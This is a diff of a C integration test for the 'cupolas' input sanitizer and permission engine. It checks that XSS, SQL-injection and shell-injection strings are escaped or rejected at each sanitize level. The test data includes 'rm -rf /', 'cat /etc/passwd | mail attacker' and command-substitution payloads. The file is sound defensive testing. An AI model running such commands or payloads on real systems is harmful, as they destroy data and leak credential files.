@@ -1,25 +1,24 @@
-// SPDX-FileCopyrightText: 2025-2026 SPHARX Ltd.
-// SPDX-License-Identifier: AGPL-3.0-or-later OR Apache-2.0
+/* SPDX-FileCopyrightText: 2025-2026 SPHARX Ltd. */
+/* SPDX-License-Identifier: AGPL-3.0-or-later OR Apache-2.0 */
 
 /*
+ * test_protection_chain.c - cupolas protection chain integration test (INT-11)
  *
- * @file test_protection_chain.c
- * @brief cupolas 4-layer protection chain integration test (INT-11)
+ * Covers the protection chain end to end:
+ *   INT-11.1  default-level sanitization of XSS/SQL/shell attack vectors
+ *   INT-11.2  level-driven enforcement (NONE/LOW/MEDIUM/HIGH/MAX)
+ *   INT-11.3  RBAC permission engine with role isolation
  *
- * Tests the complete security protection chain:
- *   INT-11.1: XSS and SQL injection sanitization
- *   INT-11.2: 4-stage purification pipeline (regex → type → length → encoding)
- *   INT-11.3: RBAC+YAML permission engine with role isolation
- *
- * @note This is a standalone integration test with a main() function.
+ * The sanitizer is escape- or reject-based; it never removes keywords. The
+ * assertions therefore verify the documented result code and the absence of
+ * unescaped metacharacters, not the absence of words like "onerror".
  */
 
 #include "cupolas.h"
-#include "airy_memory.h"
+#include "sanitizer/sanitizer.h"
 
 #include <assert.h>
 #include <stdio.h>
-#include <stdlib.h>
 #include <string.h>
 
 /* ============================================================================
@@ -39,7 +38,7 @@ static int g_tests_passed = 0;
 static int g_tests_failed = 0;
 
 /* ============================================================================
- * Helper: string contains substring check
+ * Helpers
  * ============================================================================ */
 
 static int str_contains(const char *haystack, const char *needle)
@@ -49,416 +48,273 @@ static int str_contains(const char *haystack, const char *needle)
     return strstr(haystack, needle) != NULL;
 }
 
+static int has_raw_angle(const char *text)
+{
+    return text && (strchr(text, '<') != NULL || strchr(text, '>') != NULL);
+}
+
+static void ctx_set_level(sanitize_context_t *ctx, sanitize_level_t level)
+{
+    sanitizer_default_context(ctx);
+    ctx->level = level;
+}
+
 /* ============================================================================
- * INT-11.1: Protection Chain - XSS and SQL Injection Sanitization
+ * INT-11.1: Default-level sanitization (escape contract, MEDIUM by default)
  * ============================================================================ */
 
-TEST(protection_chain_xss_sanitization)
+TEST(sanitize_xss_default_level)
 {
-    /* Initialize cupolas module */
     airy_err_t init_err = AIRY_OK;
     int rc = cupolas_init(NULL, &init_err);
     assert(rc == 0);
     assert(init_err == AIRY_OK);
 
-    /* Test XSS payload: <script>alert('xss')</script> */
-    {
-        const char *xss_input = "<script>alert('xss')</script>";
+    const char *xss = "<script>alert('xss')</script>";
+    char output[256];
+    memset(output, 0, sizeof(output));
+
+    int ret = cupolas_sanitize_input(xss, output, sizeof(output));
+    assert(ret == 0);
+
+    /* Every angle bracket must be escaped, so no raw tag survives. */
+    assert(!has_raw_angle(output));
+    assert(strcmp(output, xss) != 0);
+    printf("    XSS escaped: '%s' -> '%s'\n", xss, output);
+
+    cupolas_cleanup();
+}
+
+TEST(sanitize_sql_default_level)
+{
+    airy_err_t init_err = AIRY_OK;
+    int rc = cupolas_init(NULL, &init_err);
+    assert(rc == 0);
+
+    const char *sql = "' OR '1'='1";
+    char output[256];
+    memset(output, 0, sizeof(output));
+
+    int ret = cupolas_sanitize_input(sql, output, sizeof(output));
+    assert(ret == 0);
+
+    /* SQL escaping doubles the leading quote. */
+    assert(output[0] == '\'' && output[1] == '\'');
+    assert(strcmp(output, sql) != 0);
+    printf("    SQL escaped: '%s' -> '%s'\n", sql, output);
+
+    cupolas_cleanup();
+}
+
+TEST(sanitize_attack_vectors)
+{
+    airy_err_t init_err = AIRY_OK;
+    int rc = cupolas_init(NULL, &init_err);
+    assert(rc == 0);
+
+    /* XSS vectors: all angle brackets must be neutralized. */
+    const char *xss[] = {
+        "<img src=x onerror=alert(1)>",
+        "javascript:void(0)",
+        "<body onload=alert('xss')>",
+        "\"><script>alert(1)</script>",
+    };
+
+    for (size_t i = 0; i < sizeof(xss) / sizeof(xss[0]); i++) {
         char output[256];
         memset(output, 0, sizeof(output));
 
-        int ret = cupolas_sanitize_input(xss_input, output, sizeof(output));
+        int ret = cupolas_sanitize_input(xss[i], output, sizeof(output));
         assert(ret == 0);
-
-        /* Sanitized output should NOT contain the <script> tag */
-        assert(!str_contains(output, "<script>"));
-        assert(!str_contains(output, "<script"));
-        printf("    XSS payload sanitized: '%s' -> '%s'\n", xss_input, output);
+        assert(!has_raw_angle(output));
+        printf("    XSS vector %zu neutralized: '%s' -> '%s'\n", i + 1, xss[i], output);
     }
 
-    /* Test SQL injection payload: ' OR '1'='1 */
-    {
-        const char *sql_input = "' OR '1'='1";
+    /* Shell vectors: metacharacters must be escaped, not passed through. */
+    const char *shell[] = {
+        "foo; rm -rf /",
+        "cat /etc/passwd | mail attacker",
+        "$(whoami) `id`",
+    };
+
+    for (size_t i = 0; i < sizeof(shell) / sizeof(shell[0]); i++) {
         char output[256];
         memset(output, 0, sizeof(output));
 
-        int ret = cupolas_sanitize_input(sql_input, output, sizeof(output));
+        int ret = cupolas_sanitize_input(shell[i], output, sizeof(output));
         assert(ret == 0);
-
-        /* Sanitized output should NOT contain the SQL injection pattern */
-        assert(!str_contains(output, "' OR '1'='1"));
-        printf("    SQL injection sanitized: '%s' -> '%s'\n", sql_input, output);
+        assert(strcmp(output, shell[i]) != 0);
+        printf("    Shell vector %zu escaped: '%s' -> '%s'\n", i + 1, shell[i], output);
     }
 
-    /* Test additional XSS vectors */
-    {
-        const char *inputs[] = {
-            "<img src=x onerror=alert(1)>",
-            "javascript:void(0)",
-            "<body onload=alert('xss')>",
-            "\"><script>alert(1)</script>",
-        };
-        const char *forbidden[] = {
-            "onerror",
-            "javascript:",
-            "onload",
-            "<script>",
-        };
+    cupolas_cleanup();
+}
 
-        for (int i = 0; i < 4; i++) {
-            char output[256];
-            memset(output, 0, sizeof(output));
+TEST(sanitize_safe_passthrough)
+{
+    airy_err_t init_err = AIRY_OK;
+    int rc = cupolas_init(NULL, &init_err);
+    assert(rc == 0);
 
-            int ret = cupolas_sanitize_input(inputs[i], output, sizeof(output));
-            assert(ret == 0);
+    const char *safe_input = "Hello, World! This is safe text.";
+    char output[256];
+    memset(output, 0, sizeof(output));
 
-            assert(!str_contains(output, forbidden[i]));
-            printf("    XSS variant %d sanitized: '%s' -> '%s'\n", i + 1, inputs[i], output);
-        }
+    int ret = cupolas_sanitize_input(safe_input, output, sizeof(output));
+    assert(ret == 0);
+
+    /* Benign input is preserved byte for byte. */
+    assert(strcmp(output, safe_input) == 0);
+    printf("    Safe input preserved: '%s'\n", output);
+
+    cupolas_cleanup();
+}
+
+TEST(sanitize_null_and_bounds)
+{
+    airy_err_t init_err = AIRY_OK;
+    int rc = cupolas_init(NULL, &init_err);
+    assert(rc == 0);
+
+    char output[256];
+
+    /* NULL and zero-size arguments are rejected up front. */
+    assert(cupolas_sanitize_input(NULL, output, sizeof(output)) != 0);
+    assert(cupolas_sanitize_input("data", NULL, 0) != 0);
+
+    /* A small buffer must stay inside its declared size (canary intact). */
+    char small[8];
+    memset(small, 0xAA, sizeof(small));
+
+    int ret = cupolas_sanitize_input("<script>alert(1)</script>", small, 4);
+    assert(ret == 0 || ret < 0);
+    assert(strlen(small) < 4);
+    for (size_t i = 4; i < sizeof(small); i++) {
+        assert((unsigned char)small[i] == 0xAA);
     }
+    printf("    NULL/zero-size rejected, small buffer bounded to '%s'\n", small);
 
-    /* Test additional SQL injection vectors */
-    {
-        const char *inputs[] = {
-            "1; DROP TABLE users--",
-            "admin'--",
-            "1 UNION SELECT * FROM users",
-        };
-        const char *forbidden[] = {
-            "DROP TABLE",
-            "'--",
-            "UNION SELECT",
-        };
-
-        for (int i = 0; i < 3; i++) {
-            char output[256];
-            memset(output, 0, sizeof(output));
-
-            int ret = cupolas_sanitize_input(inputs[i], output, sizeof(output));
-            assert(ret == 0);
-
-            assert(!str_contains(output, forbidden[i]));
-            printf("    SQL injection variant %d sanitized: '%s' -> '%s'\n", i + 1, inputs[i],
-                   output);
-        }
-    }
-
-    /* Test safe input passes through unchanged */
-    {
-        const char *safe_input = "Hello, World! This is safe text.";
-        char output[256];
-        memset(output, 0, sizeof(output));
-
-        int ret = cupolas_sanitize_input(safe_input, output, sizeof(output));
-        assert(ret == 0);
-
-        /* Safe input should be preserved */
-        assert(strcmp(output, safe_input) == 0);
-        printf("    Safe input preserved: '%s'\n", output);
-    }
-
-    /* Test NULL input handling */
-    {
-        char output[256];
-        memset(output, 0, sizeof(output));
-
-        int ret = cupolas_sanitize_input(NULL, output, sizeof(output));
-        /* Should return error for NULL input */
-        assert(ret != 0);
-        printf("    NULL input correctly rejected\n");
-    }
-
-    /* Test small output buffer handling */
-    {
-        const char *input = "<script>alert('xss')</script>";
-        char output[4];
-        memset(output, 0, sizeof(output));
-
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        /* Should handle small buffer gracefully */
-        assert(ret == 0 || ret < 0);
-        printf("    Small buffer handled gracefully\n");
-    }
-
-    /* Cleanup */
     cupolas_cleanup();
 }
 
 /* ============================================================================
- * INT-11.2: 4-Stage Purification Pipeline
- *
- * The 4-stage purification pipeline processes input through:
- *   Stage 1: Regex - pattern matching and removal
- *   Stage 2: Type   - type validation and coercion
- *   Stage 3: Length - length validation and truncation
- *   Stage 4: Encoding - encoding validation and normalization
+ * INT-11.2: Level-driven enforcement (NONE/LOW/MEDIUM/HIGH/MAX)
  * ============================================================================ */
 
-TEST(purification_pipeline_regex_stage)
+TEST(level_none_passthrough)
 {
-    /* Stage 1: Regex-based pattern matching and removal */
-    airy_err_t init_err = AIRY_OK;
-    int rc = cupolas_init(NULL, &init_err);
-    assert(rc == 0);
+    sanitizer_t *san = sanitizer_create(NULL);
+    assert(san != NULL);
 
-    /* Regex stage should strip HTML/XML tags */
-    {
-        const char *input = "<b>bold</b> and <i>italic</i>";
-        char output[256];
-        memset(output, 0, sizeof(output));
+    sanitize_context_t ctx;
+    ctx_set_level(&ctx, SANITIZE_LEVEL_NONE);
 
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        assert(ret == 0);
+    const char *input = "<script>alert(1)</script>";
+    char output[256];
 
-        /* Tags should be removed or neutralized */
-        assert(!str_contains(output, "<b>"));
-        assert(!str_contains(output, "<i>"));
-        printf("    Stage 1 (regex): HTML tags removed from '%s' -> '%s'\n", input, output);
-    }
+    assert(sanitizer_sanitize(san, input, output, sizeof(output), &ctx) == SANITIZE_OK);
+    assert(strcmp(output, input) == 0);
+    assert(sanitizer_is_safe(san, input, &ctx));
+    printf("    NONE passes input through unchanged\n");
 
-    /* Regex stage should strip event handlers */
-    {
-        const char *input = "<div onclick='steal()'>click</div>";
-        char output[256];
-        memset(output, 0, sizeof(output));
-
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        assert(ret == 0);
-
-        assert(!str_contains(output, "onclick"));
-        printf("    Stage 1 (regex): Event handler removed from '%s' -> '%s'\n", input, output);
-    }
-
-    /* Regex stage should handle CSS expressions */
-    {
-        const char *input = "expression(alert(1))";
-        char output[256];
-        memset(output, 0, sizeof(output));
-
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        assert(ret == 0);
-
-        assert(!str_contains(output, "expression("));
-        printf("    Stage 1 (regex): CSS expression removed from '%s' -> '%s'\n", input, output);
-    }
-
-    cupolas_cleanup();
+    sanitizer_destroy(san);
 }
 
-TEST(purification_pipeline_type_stage)
+TEST(level_low_medium_escape)
 {
-    /* Stage 2: Type validation and coercion */
-    airy_err_t init_err = AIRY_OK;
-    int rc = cupolas_init(NULL, &init_err);
-    assert(rc == 0);
+    sanitizer_t *san = sanitizer_create(NULL);
+    assert(san != NULL);
 
-    /* Type stage should detect and neutralize SQL comment injection */
-    {
-        const char *input = "admin'--";
-        char output[256];
-        memset(output, 0, sizeof(output));
+    const char *input = "<script>alert(1)</script>";
+    char output[256];
 
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        assert(ret == 0);
+    sanitize_context_t ctx;
+    ctx_set_level(&ctx, SANITIZE_LEVEL_LOW);
+    assert(sanitizer_sanitize(san, input, output, sizeof(output), &ctx) == SANITIZE_MODIFIED);
+    assert(!has_raw_angle(output));
+    assert(!sanitizer_is_safe(san, input, &ctx));
 
-        assert(!str_contains(output, "'--"));
-        printf("    Stage 2 (type): SQL comment injection neutralized '%s' -> '%s'\n", input,
-               output);
-    }
+    ctx_set_level(&ctx, SANITIZE_LEVEL_MEDIUM);
+    assert(sanitizer_sanitize(san, input, output, sizeof(output), &ctx) == SANITIZE_MODIFIED);
+    assert(!has_raw_angle(output));
+    assert(sanitizer_is_safe(san, "plain text 42", &ctx));
+    printf("    LOW/MEDIUM escape metacharacters: '%s' -> '%s'\n", input, output);
 
-    /* Type stage should handle semicolon injection */
-    {
-        const char *input = "value; DROP TABLE users;";
-        char output[256];
-        memset(output, 0, sizeof(output));
-
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        assert(ret == 0);
-
-        assert(!str_contains(output, "DROP TABLE"));
-        printf("    Stage 2 (type): Semicolon injection neutralized '%s' -> '%s'\n", input, output);
-    }
-
-    /* Type stage should handle union-based injection */
-    {
-        const char *input = "1 UNION SELECT password FROM users";
-        char output[256];
-        memset(output, 0, sizeof(output));
-
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        assert(ret == 0);
-
-        assert(!str_contains(output, "UNION SELECT"));
-        printf("    Stage 2 (type): UNION injection neutralized '%s' -> '%s'\n", input, output);
-    }
-
-    cupolas_cleanup();
+    sanitizer_destroy(san);
 }
 
-TEST(purification_pipeline_length_stage)
+TEST(level_high_whitelist)
 {
-    /* Stage 3: Length validation and truncation */
-    airy_err_t init_err = AIRY_OK;
-    int rc = cupolas_init(NULL, &init_err);
-    assert(rc == 0);
+    sanitizer_t *san = sanitizer_create(NULL);
+    assert(san != NULL);
 
-    /* Length stage should handle long input within buffer */
-    {
-        char long_input[512];
-        memset(long_input, 'A', sizeof(long_input) - 1);
-        long_input[sizeof(long_input) - 1] = '\0';
+    sanitize_context_t ctx;
+    ctx_set_level(&ctx, SANITIZE_LEVEL_HIGH);
 
-        char output[512];
-        memset(output, 0, sizeof(output));
+    char output[256];
 
-        int ret = cupolas_sanitize_input(long_input, output, sizeof(output));
-        assert(ret == 0);
+    /* Non-whitelisted input is rejected and the output stays empty. */
+    char dirty[64];
+    memset(dirty, 0x5A, sizeof(dirty));
+    assert(sanitizer_sanitize(san, "<script>", dirty, sizeof(dirty), &ctx) == SANITIZE_REJECTED);
+    assert(dirty[0] == '\0');
+    assert(!sanitizer_is_safe(san, "<script>", &ctx));
 
-        /* Output should be properly null-terminated */
-        assert(strlen(output) < sizeof(output));
-        printf("    Stage 3 (length): Long input (%zu chars) handled, output length=%zu\n",
-               strlen(long_input), strlen(output));
-    }
+    /* Whitelisted input passes through untouched. */
+    const char *clean = "Hello, world-42";
+    assert(sanitizer_sanitize(san, clean, output, sizeof(output), &ctx) == SANITIZE_OK);
+    assert(strcmp(output, clean) == 0);
+    assert(sanitizer_is_safe(san, clean, &ctx));
+    printf("    HIGH rejects non-whitelisted and accepts plain text\n");
 
-    /* Length stage should handle empty input */
-    {
-        char output[256];
-        memset(output, 0xFF, sizeof(output));
-
-        int ret = cupolas_sanitize_input("", output, sizeof(output));
-        assert(ret == 0);
-
-        /* Empty input should produce empty or valid output */
-        assert(strlen(output) >= 0);
-        printf("    Stage 3 (length): Empty input handled\n");
-    }
-
-    /* Length stage should handle input exactly at buffer boundary */
-    {
-        char exact_input[64];
-        memset(exact_input, 'X', 63);
-        exact_input[63] = '\0';
-
-        char output[64];
-        memset(output, 0, sizeof(output));
-
-        int ret = cupolas_sanitize_input(exact_input, output, sizeof(output));
-        assert(ret == 0);
-
-        assert(strlen(output) < sizeof(output));
-        printf("    Stage 3 (length): Boundary input handled\n");
-    }
-
-    cupolas_cleanup();
+    sanitizer_destroy(san);
 }
 
-TEST(purification_pipeline_encoding_stage)
+TEST(level_max_rejects_all)
 {
-    /* Stage 4: Encoding validation and normalization */
-    airy_err_t init_err = AIRY_OK;
-    int rc = cupolas_init(NULL, &init_err);
-    assert(rc == 0);
+    sanitizer_t *san = sanitizer_create(NULL);
+    assert(san != NULL);
 
-    /* Encoding stage should handle URL-encoded XSS */
-    {
-        const char *input = "%3Cscript%3Ealert('xss')%3C%2Fscript%3E";
-        char output[256];
-        memset(output, 0, sizeof(output));
+    sanitize_context_t ctx;
+    ctx_set_level(&ctx, SANITIZE_LEVEL_MAX);
 
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        assert(ret == 0);
+    char output[256];
+    memset(output, 0x5A, sizeof(output));
+    assert(sanitizer_sanitize(san, "anything", output, sizeof(output), &ctx) == SANITIZE_REJECTED);
+    assert(output[0] == '\0');
+    assert(!sanitizer_is_safe(san, "anything", &ctx));
+    printf("    MAX rejects all input\n");
 
-        /* URL-encoded script tags should be decoded and sanitized */
-        assert(!str_contains(output, "<script"));
-        assert(!str_contains(output, "%3Cscript"));
-        printf("    Stage 4 (encoding): URL-encoded XSS sanitized '%s' -> '%s'\n", input, output);
-    }
-
-    /* Encoding stage should handle hex-encoded characters */
-    {
-        const char *input = "&#x3C;script&#x3E;";
-        char output[256];
-        memset(output, 0, sizeof(output));
-
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        assert(ret == 0);
-
-        assert(!str_contains(output, "<script"));
-        printf("    Stage 4 (encoding): Hex-encoded XSS sanitized '%s' -> '%s'\n", input, output);
-    }
-
-    /* Encoding stage should handle mixed encoding */
-    {
-        const char *input = "test%00%01%02data";
-        char output[256];
-        memset(output, 0, sizeof(output));
-
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        assert(ret == 0);
-
-        /* Null bytes should be removed */
-        assert(!str_contains(output, "%00"));
-        printf("    Stage 4 (encoding): Mixed encoding sanitized '%s' -> '%s'\n", input, output);
-    }
-
-    cupolas_cleanup();
+    sanitizer_destroy(san);
 }
 
-TEST(purification_pipeline_combined)
+TEST(level_medium_rule_stage)
 {
-    /* Test the full 4-stage pipeline working together */
-    airy_err_t init_err = AIRY_OK;
-    int rc = cupolas_init(NULL, &init_err);
-    assert(rc == 0);
+    sanitizer_t *san = sanitizer_create(NULL);
+    assert(san != NULL);
 
-    /* Combined attack: XSS + SQL + encoding bypass */
-    {
-        const char *input = "%3Cscript%3Ealert('xss')%3C%2Fscript%3E ' OR '1'='1";
-        char output[512];
-        memset(output, 0, sizeof(output));
+    sanitize_context_t ctx;
+    ctx_set_level(&ctx, SANITIZE_LEVEL_MEDIUM);
 
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        assert(ret == 0);
+    char output[256];
 
-        /* All attack vectors should be neutralized */
-        assert(!str_contains(output, "<script"));
-        assert(!str_contains(output, "%3Cscript"));
-        assert(!str_contains(output, "' OR '1'='1"));
-        /* Output should still contain something (not empty) */
-        assert(strlen(output) > 0);
-        printf("    Combined pipeline: Multi-vector attack sanitized '%s' -> '%s'\n", input,
-               output);
-    }
+    /* Literal rule with a replacement rewrites the escaped output. */
+    assert(sanitizer_add_rule(san, "DROP TABLE", "[removed]") == 0);
+    assert(sanitizer_sanitize(san, "1; DROP TABLE users", output, sizeof(output), &ctx) ==
+           SANITIZE_MODIFIED);
+    assert(!str_contains(output, "DROP TABLE"));
+    assert(str_contains(output, "[removed]"));
 
-    /* Pipe-delimited input with mixed content */
-    {
-        const char *input = "safe|data|<script>xss</script>|normal|' OR 1=1--";
-        char output[512];
-        memset(output, 0, sizeof(output));
+    /* Rule without a replacement fails closed. */
+    assert(sanitizer_add_rule(san, "FORBIDDEN", NULL) == 0);
+    assert(sanitizer_sanitize(san, "FORBIDDEN", output, sizeof(output), &ctx) == SANITIZE_REJECTED);
+    printf("    MEDIUM applies literal rules and fails closed on reject rules\n");
 
-        int ret = cupolas_sanitize_input(input, output, sizeof(output));
-        assert(ret == 0);
-
-        assert(!str_contains(output, "<script"));
-        assert(!str_contains(output, "1=1--"));
-        /* Safe parts should survive */
-        assert(str_contains(output, "safe") || str_contains(output, "normal"));
-        printf("    Combined pipeline: Mixed content sanitized '%s' -> '%s'\n", input, output);
-    }
-
-    /* Verify cupolas version is available */
-    {
-        const char *version = cupolas_version();
-        assert(version != NULL);
-        assert(strlen(version) > 0);
-        printf("    cupolas version: %s\n", version);
-    }
-
-    cupolas_cleanup();
+    sanitizer_destroy(san);
 }
 
 /* ============================================================================
- * INT-11.3: RBAC+YAML Permission Engine
+ * INT-11.3: RBAC permission engine with role isolation
  * ============================================================================ */
 
 TEST(permission_engine_admin_access)
@@ -708,17 +564,21 @@ int main(void)
 {
     printf("=== cupolas Protection Chain Integration Tests (INT-11) ===\n\n");
 
-    printf("--- INT-11.1: XSS and SQL Injection Sanitization ---\n");
-    RUN_TEST(protection_chain_xss_sanitization);
+    printf("--- INT-11.1: Default-level sanitization ---\n");
+    RUN_TEST(sanitize_xss_default_level);
+    RUN_TEST(sanitize_sql_default_level);
+    RUN_TEST(sanitize_attack_vectors);
+    RUN_TEST(sanitize_safe_passthrough);
+    RUN_TEST(sanitize_null_and_bounds);
 
-    printf("\n--- INT-11.2: 4-Stage Purification Pipeline ---\n");
-    RUN_TEST(purification_pipeline_regex_stage);
-    RUN_TEST(purification_pipeline_type_stage);
-    RUN_TEST(purification_pipeline_length_stage);
-    RUN_TEST(purification_pipeline_encoding_stage);
-    RUN_TEST(purification_pipeline_combined);
+    printf("\n--- INT-11.2: Level-driven enforcement ---\n");
+    RUN_TEST(level_none_passthrough);
+    RUN_TEST(level_low_medium_escape);
+    RUN_TEST(level_high_whitelist);
+    RUN_TEST(level_max_rejects_all);
+    RUN_TEST(level_medium_rule_stage);
 
-    printf("\n--- INT-11.3: RBAC+YAML Permission Engine ---\n");
+    printf("\n--- INT-11.3: RBAC permission engine ---\n");
     RUN_TEST(permission_engine_admin_access);
     RUN_TEST(permission_engine_user_denied);
     RUN_TEST(permission_engine_guest_isolation);
